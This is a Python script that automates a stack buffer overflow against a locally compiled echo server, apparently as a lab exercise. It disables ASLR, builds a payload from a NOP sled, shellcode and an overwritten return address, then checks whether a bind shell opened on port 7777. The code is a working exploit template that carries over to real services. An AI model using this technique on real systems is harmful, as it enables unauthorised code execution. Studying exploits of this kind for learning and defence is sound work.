#!/usr/bin/python
from ast import literal_eval
import subprocess
import time
import socket
import sys
import os
import signal

SERVER = "./output/prog";
SERVER_COMP_CMD = "./compile_server.sh"
OPCODES_CMD = "./get_opcodes.sh"
ASLR_CMD = "./disable_aslr.sh"
CORE_DUMP_CMD = "./enable_core_dumps.sh"
ENV_EXEC_CMD = "./envexec.sh"

NOP_SLED_CNT = 40
NOP_SLED = "\x90"
PADDING_VALUE = "A"
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 4567
EXPLOIT_PORT = 7777 

def prepare_env():
	global ASLR_CMD
	global CORE_DUMP_CMD
	FNULL = open(os.devnull, 'w')
	subprocess.call([ASLR_CMD], stdout=FNULL, stderr=FNULL, close_fds=True)
	subprocess.call([CORE_DUMP_CMD])

def compile_echo_server():
	global SERVER_COMP_CMD
	FNULL = open(os.devnull, 'w')
	subprocess.call([SERVER_COMP_CMD], stdout=FNULL, stderr=FNULL, close_fds=True)	
	
def run_echo_server():
	global SERVER
	global ENV_EXEC_CMD
	FNULL = open(os.devnull, 'w')
	proc = subprocess.Popen([ENV_EXEC_CMD, SERVER], stdout=FNULL, stderr=FNULL, close_fds=True)
	return proc.pid

def close_echo_server(pid):
	os.killpg(os.getpgid(pid), signal.SIGTERM)
	

def get_shell_opcodes():
	global OPCODES_CMD
	opcodes = shellcode = subprocess.Popen([OPCODES_CMD], stdout=subprocess.PIPE).communicate()[0]
	opcodes = opcodes[1:-2]
	return literal_eval("'%s'"%opcodes)

def convert_to_little_endian(address):
	split_addr = [address[i:i + 2] for i in range(0, len(address), 2)]
	endian_addr = ""
	for hex_val in split_addr:
		endian_addr = "\\x" + hex_val + endian_addr
	return literal_eval("'%s'"%endian_addr)

def generate_overflow_string(stack_size, endian_addr, shellcode):
	global NOP_SLED_CNT
	global NOP_SLED
	global PADDING_VALUE
	nopsled = NOP_SLED * NOP_SLED_CNT
	padding = PADDING_VALUE * (stack_size - NOP_SLED_CNT - len(shellcode))
	return nopsled + shellcode + padding + endian_addr

def send_string_to_echo_server(overflow_string):
	global SERVER_HOST
	global SERVER_PORT
	serv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serv_sock.connect((SERVER_HOST, SERVER_PORT))
	serv_sock.send(overflow_string)
	serv_sock.close()

def test_exploit():
	global SERVER_HOST
	global EXPLOIT_PORT
	expl_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		expl_socket.connect((SERVER_HOST, EXPLOIT_PORT))
		expl_socket.close()
		return True
	except Exception as e:
		return False

if __name__ == "__main__":
	stack_size_arg = int(sys.argv[1])
	address_arg = sys.argv[2]

	prepare_env()
	compile_echo_server()
	
	server_pid = run_echo_server()

	shellcode = get_shell_opcodes()
	eip = convert_to_little_endian(address_arg)
	overflow_string = generate_overflow_string(stack_size_arg, eip, shellcode)
	
	send_string_to_echo_server(overflow_string)
	time.sleep(1)
	expl_result = test_exploit()
	print "\nExploit successful? = ", expl_result
	user_inp = raw_input("Press return to close the server: ")
	
	close_echo_server(server_pid)
	
	
